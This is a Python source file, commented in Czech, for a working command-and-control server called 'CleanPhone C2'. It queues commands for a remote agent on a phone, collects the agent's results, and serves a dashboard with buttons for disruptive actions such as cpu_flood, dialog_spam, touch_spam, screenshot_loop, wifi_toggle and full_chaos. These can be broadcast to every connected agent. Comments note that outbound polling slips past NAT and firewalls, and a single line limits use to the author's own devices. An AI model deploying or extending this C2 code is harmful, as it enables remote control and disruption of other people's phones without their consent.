#!/usr/bin/env python3
"""
🎯 CleanPhone C2 - polling server
==================================
Agent (Go binary na telefonu) pravidelně volá /task a ptá se na příkaz.
Server drží frontu příkazů; ty je plníš přes web UI nebo curl.

Výhoda: agent komunikuje SMĚREM VEN -> projde NAT/firewallem.
Funguje i když telefon je na 4G a ty na domácí WiFi.
"""

import http.server
import socketserver
import json
import socket
import urllib.parse
import threading
from datetime import datetime
from pathlib import Path

QUEUE_FILE = "tasks.json"
LOG_FILE = "c2.log"
LOCK = threading.Lock()

def now():
    return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

def load_queue():
    try:
        return json.loads(Path(QUEUE_FILE).read_text())
    except Exception:
        return {}

def save_queue(q):
    Path(QUEUE_FILE).write_text(json.dumps(q))

def push_task(agent, cmd):
    """Zařadí příkaz pro daného agenta (nebo pro všechny: agent='*')"""
    with LOCK:
        q = load_queue()
        q.setdefault(agent, []).append(cmd)
        save_queue(q)

def pop_task(agent):
    with LOCK:
        q = load_queue()
        # konkrétní agent má přednost, pak broadcast '*'
        for key in (agent, "*"):
            if key in q and q[key]:
                cmd = q[key].pop(0)
                save_queue(q)
                return cmd
        return ""

def log(msg):
    line = f"[{now()}] {msg}"
    print(line)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")


class Handler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-type", "application/json")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        p = u.path
        q = urllib.parse.parse_qs(u.query)

        if p == "/task":
            agent = q.get("id", ["unknown"])[0]
            cmd = pop_task(agent)
            if cmd:
                log(f"→ task for {agent}: {cmd}")
            self._json({"cmd": cmd})

        elif p == "/log.txt":
            try:
                body = Path(LOG_FILE).read_text()
            except Exception:
                body = ""
            self.send_response(200)
            self.send_header("Content-type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(body.encode())

        elif p == "/push":
            agent = q.get("id", ["*"])[0]
            cmd = q.get("cmd", [""])[0]
            if cmd:
                push_task(agent, cmd)
                log(f"queued for {agent}: {cmd}")
            self._json({"ok": True, "agent": agent, "cmd": cmd})

        elif p == "/queue":
            self._json(load_queue())

        else:
            self.serve_dashboard()

    def do_POST(self):
        if self.path != "/result":
            self.send_error(404)
            return
        n = int(self.headers.get("Content-Length", 0))
        data = json.loads(self.rfile.read(n) or b"{}")
        log(f"← [{data.get('id')}] {data.get('cmd')} => {data.get('result')}")
        self._json({"ok": True})

    def serve_dashboard(self):
        html = """<!DOCTYPE html><html><head><meta charset="utf-8">
<title>CleanPhone C2</title><style>
body{font-family:system-ui;background:#0d1117;color:#e6edf3;padding:24px}
h1{color:#f78166}.row{margin:8px 0}
button{background:#21262d;color:#e6edf3;border:1px solid #30363d;border-radius:6px;
padding:8px 14px;margin:4px;cursor:pointer}
button:hover{background:#f78166;color:#000}
input{background:#161b22;color:#e6edf3;border:1px solid #30363d;border-radius:6px;padding:8px}
pre{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:14px;
max-height:420px;overflow:auto;font-size:12px}
</style></head><body>
<h1>🎯 CleanPhone C2</h1>
<div class="row">Agent ID: <input id="id" value="*" size="20">
  <span style="color:#8b949e">(* = broadcast na všechny)</span></div>
<div class="row" id="btns"></div>
<div class="row"><b>Evidence:</b></div><pre id="log">...</pre>
<script>
const cmds=["info","dialog_spam:30","touch_spam:50","screenshot_loop:20",
"wifi_toggle:5","cpu_flood:8","app_spam:15","vibrate:10","full_chaos","stop"];
const box=document.getElementById("btns");
cmds.forEach(c=>{const b=document.createElement("button");
 b.textContent=c;b.onclick=()=>send(c);box.appendChild(b);});
function send(cmd){
 const id=encodeURIComponent(document.getElementById("id").value||"*");
 fetch(`/push?id=${id}&cmd=${encodeURIComponent(cmd)}`);
}
setInterval(()=>fetch("/log.txt").then(r=>r.text()).then(t=>{
 const l=document.getElementById("log");l.textContent=t.split("\\n").slice(-60).join("\\n");
 l.scrollTop=l.scrollHeight;}),2000);
</script></body></html>"""
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode())


def main():
    PORT = 8080
    Path(LOG_FILE).write_text("")
    q = load_queue()
    if not q:
        save_queue({})
    ip = socket.gethostbyname(socket.gethostname())
    print(f"""
╔═══════════════════════════════════════════════════════════╗
║              🎯 CleanPhone C2 (polling)                   ║
╚═══════════════════════════════════════════════════════════╝
  Dashboard : http://{ip}:{PORT}/
  Task feed : http://{ip}:{PORT}/task?id=<agent>
  Push      : http://{ip}:{PORT}/push?id=<agent>&cmd=<cmd>

  Na telefonu spusť:
     ./agent -mode poll -c2 http://{ip}:{PORT} -id redmi

  ⚠  Jen vlastní zařízení / vlastní lab.
""")
    class ReusableServer(socketserver.ThreadingTCPServer):
        allow_reuse_address = True
        daemon_threads = True

    with ReusableServer(("", PORT), Handler) as s:
        try:
            s.serve_forever()
        except KeyboardInterrupt:
            print("\n👋 stop")


if __name__ == "__main__":
    main()
